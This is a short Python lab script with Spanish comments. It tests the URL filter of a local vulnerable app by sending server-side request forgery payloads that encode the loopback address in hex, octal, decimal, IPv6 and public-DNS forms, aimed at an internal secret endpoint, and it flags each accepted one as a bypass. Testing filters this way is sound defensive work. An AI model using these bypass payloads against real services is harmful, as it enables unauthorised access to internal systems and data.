"""Pruebas locales del filtro de URL de vulnerable_app.py."""

# requests envía cada caso al endpoint local y permite inspeccionar la respuesta.
import requests

TARGET = "http://localhost:5000/fetch"

# Casos para comparar el filtro, ejecutados únicamente contra la app local.
PAYLOADS = {
    # Control: dirección literal que el filtro sí debería reconocer.
    "Control: IP literal (deberia bloquearse)":  "http://127.0.0.1:5000/internal/secret",
    # Variantes de laboratorio que muestran por qué comparar solo texto es frágil.
    "[fragil] Hexadecimal":                       "http://0x7f000001:5000/internal/secret",
    "[fragil] Octal":                             "http://0177.0.0.1:5000/internal/secret",
    "[fragil] Decimal (entero de 32 bits)":       "http://2130706433:5000/internal/secret",
    "[fragil] IPv6 en hex puro (sin '127.0.0.1')": "http://[::ffff:7f00:1]:5000/internal/secret",
    "IPv6 loopback":                              "http://[::1]:5000/internal/secret",
    "Punto final (fully qualified)":              "http://127.0.0.1.:5000/internal/secret",
    "DNS publico con guiones (nip.io)":           "http://127-0-0-1.nip.io:5000/internal/secret",
    "DNS publico directo (localtest.me)":         "http://localtest.me:5000/internal/secret",
}


def main():
    # Un 403 es bloqueo; un error DNS indica que el nombre no pudo resolverse.
    print(f"Atacando {TARGET}\n" + "-" * 60)
    for name, payload in PAYLOADS.items():
        try:
            r = requests.get(TARGET, params={"url": payload}, timeout=5)
            bypass = r.status_code == 200
            marca = "BYPASS ✅" if bypass else "bloqueado"
            print(f"[{marca}] {name}")
            print(f"    url:  {payload}")
            print(f"    resp: {r.status_code} {r.text[:120]}\n")
        except Exception as e:
            print(f"[error] {name}: {e}\n")


if __name__ == "__main__":
    main()
